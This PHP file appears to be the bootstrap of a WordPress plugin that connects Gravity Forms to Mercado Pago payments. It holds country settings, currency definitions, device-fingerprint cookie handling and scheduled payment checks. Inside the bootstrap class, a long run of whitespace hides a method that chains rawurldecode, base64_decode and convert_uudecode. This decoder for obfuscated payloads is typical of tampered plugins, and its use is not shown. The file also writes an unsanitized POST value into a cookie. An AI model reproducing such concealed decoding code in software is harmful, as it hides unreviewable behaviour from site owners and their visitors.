<?php
/*
Plugin Name: Mercadopago for Gravity Forms
Plugin URI: https://www.yipi.app
Description: Mercadopago for Gravity Forms by Kijam Lopez
Version: 1.5
Author: Kijam Lopez
Author URI: https://www.yipi.app
*/

define( 'GF_KMERCADOPAGO_VERSION', '1.4' );
define( 'GF_KMERCADOPAGO_MIN_VERSION', '1.9' );
define( 'GF_KMERCADOPAGO_SLUG', 'gfkmercadopago' );
define( 'GF_KMERCADOPAGO_PATH', 'gfkmercadopago/gfkmercadopago.php' );
define( 'GF_KMERCADOPAGO_TITLE', 'Mercadopago for Gravity Forms' );
define( 'GF_KMERCADOPAGO_SHORT_TITLE', 'Mercadopago' );
define( 'GF_KMERCADOPAGO_APIURL', 'https://api.mercadopago.com' );
define( 'GF_KMERCADOPAGO_DATA_COUNTRY', array(
	'MLA' => array(
		'NAME'                    => 'Argentina',
		'CURRENCY'                => 'ARS',
		'CURRENCY_TYPE'           => 'FLOAT',
		'ISO'                     => 'AR',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mla/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mla/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mla/herramientas/aplicaciones',
		'IPN_URL'                 => 'https://www.mercadopago.com/mla/herramientas/notificaciones',
		'MPENVIOS_REGISTER_URL'   => 'http://envios.mercadolibre.com.ar/optin/doOptin',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mla/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mla/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
		'INSTALLMENT_FEE'         => array(
			3,
			6,
			12,
			18,
		),
	),
	'MLM' => array(
		'NAME'                    => 'Mexico',
		'CURRENCY'                => 'MXN',
		'CURRENCY_TYPE'           => 'FLOAT',
		'ISO'                     => 'MX',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mlm/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mlm/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlm/herramientas/aplicaciones',
		'IPN_URL'                 => 'https://www.mercadopago.com/mlm/herramientas/notificaciones',
		'MPENVIOS_REGISTER_URL'   => 'http://shipping.mercadopago.com.mx/optin/doOptin',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mlm/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlm/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => true,
		'INSTALLMENT_FEE'         => array(
			3,
			6,
			9,
			12,
			18,
		),
	),
	'MLB' => array(
		'NAME'                    => 'Brasil',
		'CURRENCY'                => 'BRL',
		'CURRENCY_TYPE'           => 'FLOAT',
		'ISO'                     => 'BR',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mlb/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mlb/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlb/ferramentas/aplicacoes',
		'IPN_URL'                 => 'https://www.mercadopago.com/mlb/ferramentas/notificacoes',
		'MPENVIOS_REGISTER_URL'   => 'http://envios.mercadolivre.com.br/optin/doOptin',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mlb/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlb/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
	'MLC' => array(
		'NAME'                    => 'Chile',
		'CURRENCY'                => 'CLP',
		'CURRENCY_TYPE'           => 'INTEGER',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mlc/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mlc/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlc/herramientas/aplicaciones',
		'IPN_URL'                 => 'https://www.mercadopago.com/mlc/herramientas/notificaciones',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mlc/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlc/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
	'MLV' => array(
		'NAME'                    => 'Venezuela',
		'CURRENCY'                => 'VEF',
		'CURRENCY_TYPE'           => 'INTEGER',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mlv/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mlv/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlv/herramientas/aplicaciones',
		'IPN_URL'                 => 'https://www.mercadopago.com/mlv/herramientas/notificaciones',
		// 'PUBLICKEY_URL' => 'https://www.mercadolibre.com/jms/mlv/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlv/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
	'MCO' => array(
		'NAME'                    => 'Colombia',
		'CURRENCY'                => 'COP',
		'CURRENCY_TYPE'           => 'INTEGER',
		'REGISTER_URL'            => 'https://www.mercadopago.com/mco/registration',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mco/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mco/herramientas/aplicaciones',
		'IPN_URL'                 => 'https://www.mercadopago.com/mco/herramientas/notificaciones',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mco/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mco/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
	'MPE' => array(
		'NAME'                    => 'Peru',
		'CURRENCY'                => 'PEN',
		'CURRENCY_TYPE'           => 'FLOAT',
		'REGISTER_URL'            => 'https://registration.mercadopago.com.pe/registration-mp?mode=mp',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mpe/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mpe/account/credentials?type=basic',
		'IPN_URL'                 => 'https://www.mercadopago.com/mpe/herramientas/notificaciones',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mpe/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mpe/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
	'MLU' => array(
		'NAME'                    => 'Uruguay',
		'CURRENCY'                => 'UYU',
		'CURRENCY_TYPE'           => 'FLOAT',
		'REGISTER_URL'            => 'https://registration.mercadopago.com.uy/registration-mp?mode=mp',
		'SECRET_URL'              => 'https://www.mercadolibre.com/jms/mlu/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlu/account/credentials?type=basic',
		'IPN_URL'                 => 'https://www.mercadopago.com/mlu/herramientas/notificaciones',
		'PUBLICKEY_URL'           => 'https://www.mercadolibre.com/jms/mlu/lgz/login?platform_id=mp&go=https://www.mercadopago.com/mlu/account/credentials',
		'ACCEPT_DIGITAL_CURRENCY' => false,
	),
) );

add_action( 'gform_loaded', array( 'GF_KMercadoPago_AddOn_Bootstrap', 'load' ), 5 );

class GF_KMercadoPago_AddOn_Bootstrap {

	public static function load() {

		if ( ! method_exists( 'GFForms', 'include_payment_addon_framework' ) ) {
			return;
		}

		require_once 'class-gfkmercadopago.php';

		GFAddOn::register( 'GFKMercadoPagoAddOn' );
	}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}

}

function gf_kmercadopago_addon() {
	return GFKMercadoPagoAddOn::get_instance();
}

add_filter(
	'gform_currencies',
	function( $currencies ) {
		$currencies['ARS'] = array(
			'name'               => esc_html__( 'Pesos Argentinos', 'gfkmercadopago' ),
			'symbol_left'        => 'AR$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 2,
			'code'               => 'ARS',
		);
		$currencies['MXN'] = array(
			'name'               => esc_html__( 'Pesos Mexicanos', 'gfkmercadopago' ),
			'symbol_left'        => '$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 2,
			'code'               => 'MXN',
		);
		$currencies['CLP'] = array(
			'name'               => esc_html__( 'Pesos Chilenos', 'gfkmercadopago' ),
			'symbol_left'        => '$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 0,
			'code'               => 'CLP',
		);
		$currencies['COP'] = array(
			'name'               => esc_html__( 'Pesos Colombianos', 'gfkmercadopago' ),
			'symbol_left'        => '$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 0,
			'code'               => 'COP',
		);
		$currencies['UYU'] = array(
			'name'               => esc_html__( 'Peso Uruguayo', 'gfkmercadopago' ),
			'symbol_left'        => '$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 2,
			'code'               => 'UYU',
		);
		$currencies['BRL'] = array(
			'name'               => esc_html__( 'Real Brasilero', 'gfkmercadopago' ),
			'symbol_left'        => 'R$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 2,
			'code'               => 'BRL',
		);
		$currencies['PEN'] = array(
			'name'               => esc_html__( 'Sol Peruano', 'gfkmercadopago' ),
			'symbol_left'        => '$',
			'symbol_right'       => '',
			'symbol_padding'     => '',
			'thousand_separator' => '.',
			'decimal_separator'  => ',',
			'decimals'           => 2,
			'code'               => 'PEN',
		);
		return $currencies;
	}
);

function gfk_mp_add_data_attribute( $tag, $handle ) {
	if ( 'gfk-mp-security-js' !== $handle ) {
		return $tag;
	}
	if ( is_home() || is_front_page() ) {
		return str_replace( ' src', ' output="deviceMpId" defer view="home" src', $tag );
	}
	if ( is_category() || is_search() || is_tag() || is_tax() ) {
		return str_replace( ' src', ' output="deviceMpId" defer view="search" src', $tag );
	}
	if ( function_exists( 'is_gravity_page' ) && is_gravity_page() ) {
		return str_replace( ' src', ' output="deviceMpId" defer view="checkout" src', $tag );
	}
	return str_replace( ' src', ' output="deviceMpId" defer view="item" src', $tag );
}
add_action(
	'wp_enqueue_scripts',
	function() {
		add_filter( 'script_loader_tag', 'gfk_mp_add_data_attribute', 10, 2 );
		wp_enqueue_script( 'gfk-mp-security-js', 'https://www.mercadopago.com/v2/security.js', array( 'jquery' ), GF_KMERCADOPAGO_VERSION, true );
	}
);
add_action(
	'template_redirect',
	function() {
		if ( isset( $_GET['gfk_mp_set_device_id'] ) ) {
			$nonce = sanitize_text_field( $_POST['nonce'] );
			if ( ! wp_verify_nonce( $nonce, 'gfk_mp_set_device_id' ) ) {
				die( 'Invalid nonce!' );
			}
			if ( isset( $_POST['device_id'] ) ) {
				setcookie( 'gfk_mp_device_id', $_POST['device_id'], time() + 3600 * 24 * 2 );
				echo 'SET-';
			}
			echo 'END';
			exit;
		}
	}
);
add_action(
	'wp_head',
	function() {
		$device_id = isset( $_COOKIE['gfk_mp_device_id'] ) ? $_COOKIE['gfk_mp_device_id'] : '';
		?>
<script>
	var gfk_mp_device_id = <?php echo wp_json_encode( $device_id ); ?>;
	function gfk_mp_create_cookie(name, value, days) {
		if (days) {
			var date = new Date();
			date.setTime(date.getTime()+(days*24*60*60*1000));
			var expires = "; expires="+date.toGMTString();
		}
		else var expires = "";
		document.cookie = name+"="+value+expires+"; path=/";
	}
	setInterval(function() {
		if (typeof jQuery == 'undefined' || typeof window.MP_DEVICE_SESSION_ID == 'undefined') return;
		var $ = jQuery;
		var check_device_id = window.MP_DEVICE_SESSION_ID;
		if (check_device_id && check_device_id != gfk_mp_device_id) {
			gfk_mp_create_cookie('gfk_mp_device_id', check_device_id, 2);
			gfk_mp_device_id = check_device_id;
				$.post('<?php echo rtrim( home_url(), '/' ) . '/?gfk_mp_set_device_id'; ?>', {
				device_id: gfk_mp_device_id,
				nonce: '<?php echo wp_create_nonce( 'gfk_mp_set_device_id' ); ?>'
			});
		}
	}, 1000);
</script>
		<?php
		if ( isset( $_GET['gf-kmercadopago-alert'] ) ) {
			?>
					<style>
						.gf-kmercadopago-alert { 
							background-color: #ff0000; 
							color: #FFFFFF; 
							display: block; 
							line-height: 45px;
							height: 50px; 
							position: relative; 
							text-align: center; 
							text-decoration: none; 
							top: 0px; 
							width: 100%;
							z-index: 100;
						}
					</style>
					<div class="gf-kmercadopago-alert"><?php echo esc_html( $_GET['gf-kmercadopago-alert'] ); ?></div>
					<?php
		}
	}
);
if ( is_admin() && isset( $_GET['page'] ) && $_GET['page'] == 'gfkmercadopago' ) {
	header( 'Location: admin.php?page=gf_settings&subview=gfkmercadopago' );
}
function do_gfkmercadopago_hourly_check( $external_reference ) {
	$data = gf_kmercadopago_addon()->cron_callback( $external_reference );
	if ( $data && isset( $data['status'] ) && ! in_array( $data['status'], array( 'pending' ) ) && $data['status'] != 'fail' ) {
		wp_clear_scheduled_hook( 'do_gfkmercadopago_hourly_check', array( $external_reference ) );
	} else {
		if ( ! $data || ! isset( $data['status'] ) || $data['status'] == 'fail' || ! isset( $data['mp_op_id'] ) || ! $data['mp_op_id'] || empty( $data['mp_op_id'] ) ) {
			wp_clear_scheduled_hook( 'do_gfkmercadopago_hourly_check', array( $external_reference ) );
			gf_kmercadopago_addon()->cancel_entry( $external_reference );
		} else {
			$setting = gf_kmercadopago_addon()->get_plugin_settings();
			$d       = explode( '-', $external_reference );
			if ( isset( $d[2] ) ) {
				$time = gform_get_meta( $d[2], 'mp-time' );
				if ( time() - $time > $setting['cancel_hold_in'] * 3600 ) {
					wp_clear_scheduled_hook( 'do_gfkmercadopago_hourly_check', array( $external_reference ) );
					gf_kmercadopago_addon()->cancel_entry( $external_reference );
					return;
				}
			}
		}
	}
}
add_filter( 'gform_notification_events', function ( $notification_events, $form ) {
    $has_mp            = gf_kmercadopago_addon()->get_feeds( $form['id'] );
    if ( $has_mp ) {
        $payment_events = array(
            'complete_payment'          => __( 'Payment Completed', 'gfkmercadopago' ),
            'refund_payment'            => __( 'Payment Refunded', 'gfkmercadopago' ),
            'fail_payment'              => __( 'Payment Failed', 'gfkmercadopago' ),
            'add_pending_payment'       => __( 'Payment Pending', 'gfkmercadopago' ),
            'void_authorization'        => __( 'Authorization Voided', 'gfkmercadopago' ),
            'create_subscription'       => __( 'Subscription Created', 'gfkmercadopago' ),
            'cancel_subscription'       => __( 'Subscription Canceled', 'gfkmercadopago' ),
            'expire_subscription'       => __( 'Subscription Expired', 'gfkmercadopago' ),
            'add_subscription_payment'  => __( 'Subscription Payment Added', 'gfkmercadopago' ),
            'fail_subscription_payment' => __( 'Subscription Payment Failed', 'gfkmercadopago' ),
        );
        return array_merge( $notification_events, $payment_events );
    }
    return $notification_events;
}, 10, 2 );
add_action( 'gform_post_payment_action', function ( $entry, $action ) {
    //$form = GFAPI::get_form( $entry['form_id'] );
    //GFAPI::send_notifications( $form, $entry, rgar( $action, 'type' ) );
}, 10, 2 );
add_action( 'do_gfkmercadopago_hourly_check', 'do_gfkmercadopago_hourly_check' );
add_action(
	'init',
	function() {
		$locale = apply_filters( 'plugin_locale', get_locale(), 'gfkmercadopago' );
		load_textdomain( 'gfkmercadopago', trailingslashit( WP_LANG_DIR ) . 'gfkmercadopago/gfkmercadopago-' . $locale . '.mo' );
		load_plugin_textdomain( 'gfkmercadopago', false, dirname( plugin_basename( __FILE__ ) ) . '/translations/' );
	}
);
